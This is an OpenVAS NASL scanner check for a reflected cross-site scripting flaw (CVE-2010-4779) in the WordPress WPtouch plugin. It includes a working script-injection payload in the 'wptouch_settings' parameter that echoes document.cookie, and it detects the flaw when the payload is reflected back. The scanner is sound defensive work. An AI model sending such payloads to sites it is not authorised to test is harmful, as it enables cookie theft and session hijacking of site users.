###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wptouch_plugin_wptouch_settings_xss.nasl 4590 2016-11-22 08:45:15Z cfi $
#
# WordPress WPtouch Plugin 'wptouch_settings' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute arbitrary
web script or HTML in a user's browser session in the context of an affected
site.

Impact Level: Application";

tag_affected = "WordPress WPtouch Plugin 1.9.19.4 and 1.9.20, other versions
may also be affected.";

tag_insight = "The flaw is due to input validation error in 'wptouch_settings'
parameter to 'wp-content/plugins/wptouch/include/adsense-new.php', which
is not properly sanitised before being returned to the user.";

tag_solution = "Upgrade to 3.1.1 or later,
For updates refer to http://wordpress.org/extend/plugins/wptouch";

tag_summary = "This host is installed with WordPress WPtouch Plugin and is
prone to cross-site scripting vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802014";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 4590 $");
  script_tag(name:"last_modification", value:"$Date: 2016-11-22 09:45:15 +0100 (Tue, 22 Nov 2016) $");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_bugtraq_id(45139);
  script_cve_id("CVE-2010-4779");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress WPtouch Plugin 'wptouch_settings' Parameter Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42438");
  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/xss_in_wptouch_wordpress_plugin.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_summary("check for WordPress WPtouch plugin Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

# Path of Vulnerable Page
url = dir + "/wp-content/plugins/wptouch/include/adsense-new.php?wptou" +
            "ch_settings[adsense-id]=',};//--></script><script>alert" +
            "(document.cookie);</script><!--";

## Send XSS attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, pattern:"><script>alert\(document." +
                                               "cookie\);</script><!--", check_header:TRUE)){
  security_message(port);
}
